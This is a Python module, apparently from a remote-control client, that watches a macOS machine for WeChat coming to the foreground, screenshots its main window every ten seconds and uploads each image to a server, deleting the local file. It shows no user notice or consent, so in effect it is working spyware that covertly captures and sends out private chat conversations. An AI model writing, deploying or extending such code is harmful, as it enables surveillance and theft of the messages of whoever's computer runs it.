import os
import threading
import time
import subprocess
import tempfile

from client.jobs.core.job import Job
from core.utils.formatting import get_time
from core.utils.logger import logger


class WechatScreenshotMonitor(Job):
    def __init__(self, target_app='WeChat', interval=10):
        super().__init__()
        self.target_app = target_app
        self.interval = interval
        self.is_foreground = False
        self.last_screenshot_time = 0
        self.screenshot_count = 0

    def run(self):
        try:
            time.sleep(2)
            self.send_to_server(1, f'{self.target_app} screenshot monitor started', 0)

            try:
                import pyautogui
                from Quartz import (
                    CGWindowListCopyWindowInfo,
                    kCGWindowListOptionOnScreenOnly,
                    kCGNullWindowID
                )
                self.send_to_server(1, 'Libraries loaded', 0)
            except ImportError as e:
                self.send_to_server(0, f'Import error: {e}', 0)
                self.mark_stopped()
                return

            self.mark_running()
            self.send_to_server(1, f'Monitoring {self.target_app} (interval: {self.interval}s)', 0)

            while not self.stop_event.is_set():
                current_foreground = self._is_app_foreground(self.target_app)

                if current_foreground != self.is_foreground:
                    self.is_foreground = current_foreground
                    if self.is_foreground:
                        self.send_to_server(1, f'{self.target_app} switched to foreground', 0)
                        self._take_and_upload_screenshot()
                        self.last_screenshot_time = time.time()
                    else:
                        self.send_to_server(1, f'{self.target_app} switched to background', 0)

                if self.is_foreground:
                    current_time = time.time()
                    if current_time - self.last_screenshot_time >= self.interval:
                        self._take_and_upload_screenshot()
                        self.last_screenshot_time = current_time

                time.sleep(1) # 这里！每秒检测一次前台状态

            self.send_to_server(1, f'{self.target_app} screenshot monitor stopped', 0)
        except Exception as e:
            self.send_to_server(0, f'Monitor error: {e}', 0)
        finally:
            self.mark_stopped()
            logger.info(f'Thread ended: {threading.current_thread().name}')
            self.send_to_server(1, f'Task ended: {threading.current_thread().name}', 1)

    def stop(self, notify: bool = True):
        self.request_stop(notify=notify)

    def _get_frontmost_app(self):
        """获取当前最前端的应用名称"""
        try:
            from Quartz import (
                CGWindowListCopyWindowInfo,
                kCGWindowListOptionOnScreenOnly,
                kCGNullWindowID
            )

            windows = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID)

            # 找 layer=0 且最前面的窗口
            for window in windows:
                layer = window.get('kCGWindowLayer', 999)
                if layer == 0:
                    return window.get('kCGWindowOwnerName', '')
            return None
        except:
            return None

    def _is_app_foreground(self, app_name):
        """检查指定应用是否在前台"""
        try:
            frontmost_app = self._get_frontmost_app()
            return frontmost_app and app_name.lower() in frontmost_app.lower()
        except:
            return False

    def _get_main_window_bounds(self, app_name):
        """获取应用主窗口的 bounds（只取 layer=0 的窗口）"""
        try:
            from Quartz import (
                CGWindowListCopyWindowInfo,
                kCGWindowListOptionOnScreenOnly,
                kCGNullWindowID
            )

            windows = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID)

            matching_windows = []
            for window in windows:
                owner = window.get('kCGWindowOwnerName', '')
                layer = window.get('kCGWindowLayer', 999)
                name = window.get('kCGWindowName', '')

                # 只取 layer=0 的正常窗口
                if owner and app_name.lower() in owner.lower() and layer == 0:
                    # 排除菜单栏、Dock等
                    if name not in ('Menubar', 'Dock', 'Item-0', 'Focus Proxy', ''):
                        bounds = window.get('kCGWindowBounds', {})
                        if bounds:
                            x = bounds.get('X', 0)
                            y = bounds.get('Y', 0)
                            width = bounds.get('Width', 0)
                            height = bounds.get('Height', 0)

                            if width > 100 and height > 100:
                                matching_windows.append({
                                    'x': int(x),
                                    'y': int(y),
                                    'width': int(width),
                                    'height': int(height),
                                    'name': name
                                })

            if not matching_windows:
                return None

            # 按窗口大小排序，取最大的（通常是主窗口）
            matching_windows.sort(key=lambda w: w['width'] * w['height'], reverse=True)

            return matching_windows[0]

        except Exception as e:
            return None

    def _screenshot_with_pyautogui(self, bounds):
        """使用 pyautogui 截图"""
        try:
            import pyautogui

            screenshot = pyautogui.screenshot(
                region=(bounds['x'], bounds['y'], bounds['width'], bounds['height'])
            )

            temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
            temp_file.close()
            screenshot.save(temp_file.name)

            if os.path.exists(temp_file.name) and os.path.getsize(temp_file.name) > 0:
                return temp_file.name
            else:
                try:
                    os.unlink(temp_file.name)
                except:
                    pass
                return None

        except Exception as e:
            return None

    def _take_and_upload_screenshot(self):
        """截图并上传"""
        try:
            # 再次确认应用在前台（避免在切换瞬间截图）
            if not self._is_app_foreground(self.target_app):
                self.send_to_server(1, f'{self.target_app} no longer foreground, skip screenshot', 0)
                return

            bounds = self._get_main_window_bounds(self.target_app)

            if not bounds:
                self.send_to_server(0, f'Cannot get {self.target_app} window bounds', 0)
                return

            self.send_to_server(
                1,
                f'Window: {bounds["width"]}x{bounds["height"]} at ({bounds["x"]}, {bounds["y"]})',
                0
            )

            screenshot_path = self._screenshot_with_pyautogui(bounds)

            if not screenshot_path:
                self.send_to_server(0, 'Failed to capture screenshot', 0)
                return

            try:
                file_size = os.path.getsize(screenshot_path)

                self.send_to_server(1, f'Captured ({file_size} bytes)', 0)

                filename = f'{self.target_app}_screenshot_{get_time()}.png'
                self.upload_file_via_http(screenshot_path, f'{self.target_app}_screenshots')

                self.screenshot_count += 1
                self.send_to_server(1, f'Uploaded (total: {self.screenshot_count})', 0)

            finally:
                try:
                    os.unlink(screenshot_path)
                except:
                    pass

        except Exception as e:
            self.send_to_server(0, f'Screenshot failed: {e}', 0)